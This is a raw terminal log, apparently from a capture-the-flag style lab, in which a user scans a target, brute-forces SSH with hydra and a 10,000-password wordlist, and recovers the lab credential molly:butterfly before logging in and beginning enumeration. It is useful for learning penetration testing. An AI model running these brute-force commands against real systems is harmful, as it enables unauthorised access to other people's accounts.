@@ -1,0 +1,264 @@
+┌──(kali㉿alan)-[~]
+└─$ ping 10.10.7.49
+PING 10.10.7.49 (10.10.7.49) 56(84) bytes of data.
+64 bytes from 10.10.7.49: icmp_seq=1 ttl=60 time=514 ms
+64 bytes from 10.10.7.49: icmp_seq=2 ttl=60 time=314 ms
+64 bytes from 10.10.7.49: icmp_seq=3 ttl=60 time=234 ms
+64 bytes from 10.10.7.49: icmp_seq=4 ttl=60 time=353 ms
+64 bytes from 10.10.7.49: icmp_seq=5 ttl=60 time=236 ms
+64 bytes from 10.10.7.49: icmp_seq=6 ttl=60 time=225 ms
+64 bytes from 10.10.7.49: icmp_seq=7 ttl=60 time=492 ms
+64 bytes from 10.10.7.49: icmp_seq=8 ttl=60 time=305 ms
+64 bytes from 10.10.7.49: icmp_seq=9 ttl=60 time=231 ms
+64 bytes from 10.10.7.49: icmp_seq=10 ttl=60 time=248 ms
+64 bytes from 10.10.7.49: icmp_seq=11 ttl=60 time=276 ms
+64 bytes from 10.10.7.49: icmp_seq=12 ttl=60 time=369 ms
+64 bytes from 10.10.7.49: icmp_seq=13 ttl=60 time=288 ms
+64 bytes from 10.10.7.49: icmp_seq=14 ttl=60 time=319 ms
+64 bytes from 10.10.7.49: icmp_seq=15 ttl=60 time=239 ms
+^C
+--- 10.10.7.49 ping statistics ---
+15 packets transmitted, 15 received, 0% packet loss, time 14211ms
+rtt min/avg/max/mdev = 225.280/309.473/513.748/87.705 ms
+                                                                                                                   
+┌──(kali㉿alan)-[~]
+└─$ nmap -v -sV 10.10.7.49  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 00:45 EDT
+NSE: Loaded 47 scripts for scanning.
+Initiating Ping Scan at 00:45
+Scanning 10.10.7.49 [4 ports]
+Completed Ping Scan at 00:45, 0.37s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 00:45
+Completed Parallel DNS resolution of 1 host. at 00:45, 0.02s elapsed
+Initiating SYN Stealth Scan at 00:45
+Scanning 10.10.7.49 [1000 ports]
+Discovered open port 80/tcp on 10.10.7.49
+Discovered open port 22/tcp on 10.10.7.49
+Completed SYN Stealth Scan at 00:45, 6.28s elapsed (1000 total ports)
+Initiating Service scan at 00:45
+Scanning 2 services on 10.10.7.49
+Completed Service scan at 00:45, 6.55s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.7.49.
+Initiating NSE at 00:45
+Completed NSE at 00:45, 1.41s elapsed
+Initiating NSE at 00:45
+Completed NSE at 00:45, 1.42s elapsed
+Nmap scan report for 10.10.7.49
+Host is up (0.24s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Node.js Express framework
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.58 seconds
+           Raw packets sent: 1213 (53.348KB) | Rcvd: 1010 (40.396KB)
+                                                                                                                   
+┌──(kali㉿alan)-[~]
+└─$ ssh root@10.10.7.49           
+The authenticity of host '10.10.7.49 (10.10.7.49)' can't be established.
+ED25519 key fingerprint is SHA256:X3Q2srODhoFCpeCTCyU3DRDrVtoK9LGz07lfeiW5S3Y.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.7.49' (ED25519) to the list of known hosts.
+root@10.10.7.49's password: 
+Connection closed by 10.10.7.49 port 22
+                                                                                                                   
+┌──(kali㉿alan)-[~]
+└─$ hydra               
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
+
+Options:
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -U        service module usage details
+  -m OPT    options specific for a module, see -U output for information
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+
+Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+
+Hydra is a tool to guess/crack valid login/password pairs.
+Licensed under AGPL v3.0. The newest version is always available at;
+https://github.com/vanhauser-thc/thc-hydra
+Please don't use in military or secret service organizations, or for illegal
+purposes. (This is a wish and non-binding - most such people do not care about
+laws and ethics anyway - and tell themselves they are one of the good ones.)
+
+Example:  hydra -l user -P passlist.txt ftp://192.168.0.1
+                                                                                                                   
+┌──(kali㉿alan)-[~]
+└─$ cd Downloads
+                                                                                                                   
+┌──(kali㉿alan)-[~/Downloads]
+└─$ ls       
+alanfrancis347.ovpn  xato-net-10-million-passwords-10000.txt
+                                                                                                                   
+┌──(kali㉿alan)-[~/Downloads]
+└─$ cd home     
+cd: no such file or directory: home
+                                                                                                                   
+┌──(kali㉿alan)-[~/Downloads]
+└─$ cd     
+                                                                                                                   
+┌──(kali㉿alan)-[~]
+└─$ hydra -l molly -p ~/Downloads/xato-net-10-million-passwords-10000.txt 10.10.7.49 -t 6 ssh
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-12 01:08:20
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.7.49:22/
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-12 01:08:29
+                                                                                                                   
+┌──(kali㉿alan)-[~]
+└─$ hydra -l molly -p ~/Downloads/xato-net-10-million-passwords-10000.txt 10.10.7.49 -t 6 ssh -v
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-12 01:10:47
+[VERBOSE] More tasks defined than login/pass pairs exist. Tasks reduced to 1
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.7.49:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://molly@10.10.7.49:22
+[INFO] Successful, password authentication is supported by ssh://10.10.7.49:22
+[STATUS] attack finished for 10.10.7.49 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-12 01:10:56
+                                                                                                                   
+┌──(kali㉿alan)-[~]
+└─$ hydra -l molly -p ~/Downloads/xato-net-10-million-passwords-10000.txt 10.10.7.49 -t 6 ssh -V
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-12 01:11:21
+[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.7.49:22/
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "/home/kali/Downloads/xato-net-10-million-passwords-10000.txt" - 1 of 1 [child 0] (0/0)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-12 01:11:28
+                                                                                                                   
+┌──(kali㉿alan)-[~]
+└─$ hydra -l molly -P ~/Downloads/xato-net-10-million-passwords-10000.txt 10.10.7.49 -t 6 ssh -V
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-12 01:13:07
+[DATA] max 6 tasks per 1 server, overall 6 tasks, 10000 login tries (l:1/p:10000), ~1667 tries per task
+[DATA] attacking ssh://10.10.7.49:22/
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "123456" - 1 of 10000 [child 0] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "password" - 2 of 10000 [child 1] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "12345678" - 3 of 10000 [child 2] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "qwerty" - 4 of 10000 [child 3] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "123456789" - 5 of 10000 [child 4] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "12345" - 6 of 10000 [child 5] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "1234" - 7 of 10000 [child 3] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "111111" - 8 of 10000 [child 5] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "1234567" - 9 of 10000 [child 0] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "dragon" - 10 of 10000 [child 1] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "123123" - 11 of 10000 [child 2] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "baseball" - 12 of 10000 [child 4] (0/0)
+.
+.
+.
+ATTEMPT] target 10.10.7.49 - login "molly" - pass "pegasus" - 1313 of 10000 [child 0] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "kristin" - 1314 of 10000 [child 4] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "fetish" - 1315 of 10000 [child 3] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "butterfly" - 1316 of 10000 [child 1] (0/0)
+[ATTEMPT] target 10.10.7.49 - login "molly" - pass "woody" - 1317 of 10000 [child 5] (0/0)
+[22][ssh] host: 10.10.7.49   login: molly   password: butterfly
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-12 01:28:49
+                                                                                                                   
+┌──(kali㉿alan)-[~]
+└─$ ssh molly@10.10.7.49 
+molly@10.10.7.49's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1083-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu 12 Jun 2025 05:30:18 AM UTC
+
+  System load:  0.04               Processes:             108
+  Usage of /:   18.3% of 14.47GB   Users logged in:       0
+  Memory usage: 20%                IPv4 address for ens5: 10.10.7.49
+  Swap usage:   0%
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+7 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
+molly@ip-10-10-7-49:~$ 
+molly@ip-10-10-7-49:~$ sudo -l
+[sudo] password for molly: 
+Sorry, user molly may not run sudo on ip-10-10-7-49.
+molly@ip-10-10-7-49:~$ ss  -tunl
+Netid     State      Recv-Q      Send-Q             Local Address:Port           Peer Address:Port     Process     
+udp       UNCONN     0           0                  127.0.0.53%lo:53                  0.0.0.0:*                    
+udp       UNCONN     0           0                10.10.7.49%ens5:68                  0.0.0.0:*                    
+udp       UNCONN     0           0                        0.0.0.0:68                  0.0.0.0:*                    
+tcp       LISTEN     0           128                      0.0.0.0:22                  0.0.0.0:*                    
+tcp       LISTEN     0           4096               127.0.0.53%lo:53                  0.0.0.0:*                    
+tcp       LISTEN     0           511                            *:80                        *:*                    
+tcp       LISTEN     0           128                         [::]:22                     [::]:*                    
+molly@ip-10-10-7-49:~$ find --help
+Usage: find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]
+
+default path is the current directory; default expression is -print
+expression may consist of: operators, options, tests, and actions:
+operators (decreasing precedence; -and is implicit where no others are given):
+      ( EXPR )   ! EXPR   -not EXPR   EXPR1 -a EXPR2   EXPR1 -and EXPR2
+      EXPR1 -o EXPR2   EXPR1 -or EXPR2   EXPR1 , EXPR2
+positional options (always true): -daystart -follow -regextype
+
+normal options (always true, specified before other expressions):
+      -depth --help -maxdepth LEVELS -mindepth LEVELS -mount -noleaf
+      --version -xdev -ignore_readdir_race -noignore_readdir_race
+tests (N can be +N or -N or N): -amin N -anewer FILE -atime N -cmin N
+      -cnewer FILE -ctime N -empty -false -fstype TYPE -gid N -group NAME
+      -ilname PATTERN -iname PATTERN -inum N -iwholename PATTERN -iregex PATTERN
+      -links N -lname PATTERN -mmin N -mtime N -name PATTERN -newer FILE
+      -nouser -nogroup -path PATTERN -perm [-/]MODE -regex PATTERN
+      -readable -writable -executable
+      -wholename PATTERN -size N[bcwkMG] -true -type [bcdpflsD] -uid N
+      -used N -user NAME -xtype [bcdpfls]      -context CONTEXT
+
+actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print 
+      -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
+      -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
+      -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;
+
+Valid arguments for -D:
+exec, opt, rates, search, stat, time, tree, all, help
+Use '-D help' for a description of the options, or see find(1)
+
+Please see also the documentation at http://www.gnu.org/software/findutils/.
+You can report (and track progress on fixing) bugs in the "find"
+program via the GNU findutils bug-reporting page at
+https://savannah.gnu.org/bugs/?group=findutils or, if
+you have no web access, by sending email to <bug-findutils@gnu.org>.
+molly@ip-10-10-7-49:~$ find / -name *.html 2>/dev/null^C
+molly@ip-10-10-7-49:~$ ^C
